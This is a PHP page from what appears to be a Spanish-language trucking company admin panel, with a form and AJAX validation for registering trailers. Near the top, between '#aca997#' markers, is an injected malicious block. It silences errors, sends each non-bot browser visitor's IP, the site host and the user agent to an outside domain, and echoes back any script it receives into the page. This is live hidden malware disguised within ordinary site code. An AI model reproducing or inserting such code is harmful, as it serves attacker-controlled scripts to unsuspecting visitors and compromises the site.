<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
	require("../conexion/ajax.php");
?>
<?php
#aca997#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/aca997#
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	
	function validar()
	{
		agregarCargando('cargando');
		placa = document.getElementById('txtPlaca').value;
		nroReg = document.getElementById('txtNRegistro').value;
		nroIns = document.getElementById('txtNInscripcion').value;
		nroEjes = document.getElementById('cmbNEjes').value;
		tara = document.getElementById('txtTara').value;
		pesoBruto = document.getElementById('txtPesoBruto').value;
		
		aNroReg = parseInt(nroReg);
		aNroIns = parseInt(nroIns);
		
		if(placa.length==0 || nroReg.length==0 || nroIns==0 || tara==0 || pesoBruto==0)
		{
			alert("¡ Todos los campos deben estar llenos !");
			quitarCargando('cargando');
			return;
		}
		/*else if(isNaN(nroReg) || aNroReg.toString().length!=nroReg.length) 
		{
			alert("¡ El nro. de registro debe ser un número entero !");
			quitarCargando('cargando');
			return;
		}*/
		/*else if(isNaN(nroIns) || aNroIns.toString().length!=nroIns.length) 
		{
			alert("¡ El nro. de inscripción debe ser un número entero !");
			quitarCargando('cargando');
			return;
		}*/
		else if(isNaN(tara))
		{
			alert("¡ La tara debe ser un número !");
			quitarCargando('cargando');
			return;
		}
		else if(isNaN(pesoBruto))
		{
			alert("¡ La Peso Bruto debe ser un número !");
			quitarCargando('cargando');
			return;
		}		
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=reCarreta&txtPlaca=" + placa + "&txtNRegistro=" + nroReg + "&txtNInscripcion=" + nroIns + "&cmbNEjes=" + nroEjes + "&txtTara=" + tara + "&txtPesoBruto=" + pesoBruto;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					if(resp=="exito")
					{
						alert("¡ Carreta registrada correctamente !");	
						document.getElementById('txtPlaca').value = "";
						document.getElementById('txtNRegistro').value = "";
						document.getElementById('txtNInscripcion').value = "";
						document.getElementById('cmbNEjes').value = "";
						document.getElementById('txtTara').value = "";
						document.getElementById('txtPesoBruto').value = "";
					}
				}			
			}
		}
		quitarCargando('cargando');
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - InsCarreta ::</title>
</head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="263"><form action="registrarCarreta.php" method="post" name="formCarreta" id="formCarreta">
          <table width="350" border="0" align="center">
            <tr>
              <td colspan="4"><div align="center"><strong>REGISTRAR NUEVA CARRETA </strong></div></td>
              </tr>
            <tr>
              <td width="3">&nbsp;</td>
              <td width="140"><div align="justify"><em><strong>Placa:</strong></em></div></td>
              <td width="161"><label>
                <input name="txtPlaca" type="text" id="txtPlaca">
              </label></td>
              <td width="28">&nbsp;</td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td><div align="justify"><em><strong>No Registro: </strong></em></div></td>
              <td><input name="txtNRegistro" type="text" id="txtNRegistro"></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td><div align="justify"><em><strong>No Inscripcion: </strong></em></div></td>
              <td><input name="txtNInscripcion" type="text" id="txtNInscripcion"></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td><div align="justify"><em><strong>nroEjes:</strong></em></div></td>
              <td><select name="cmbNEjes" id="cmbNEjes">
                <option>2</option>
                <option>3</option>
                <option>4</option>
                <option>5</option>
                <option>6</option>
                <option>7</option>
                <option>8</option>
              </select>              </td>
              <td><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td><div align="justify"><em><strong>Tara:</strong></em></div></td>
              <td><input name="txtTara" type="text" id="txtTara"></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="31">&nbsp;</td>
              <td><div align="justify"><em><strong>Peso Bruto: </strong></em></div></td>
              <td><input name="txtPesoBruto" type="text" id="txtPesoBruto"></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td>                <div align="center">
                <input name="btnRegistrar" type="button" id="btnRegistrar" value="Registrar" onClick="validar()">
              </div></td>
              <td><div align="center">
                <input name="btnCancelar" type="button" id="btnCancelar" value="Cancelar" onClick="go()">
              </div></td>
              <td>&nbsp;</td>
            </tr>
          </table>
                                </form>
        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2">Desarrollado por </div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>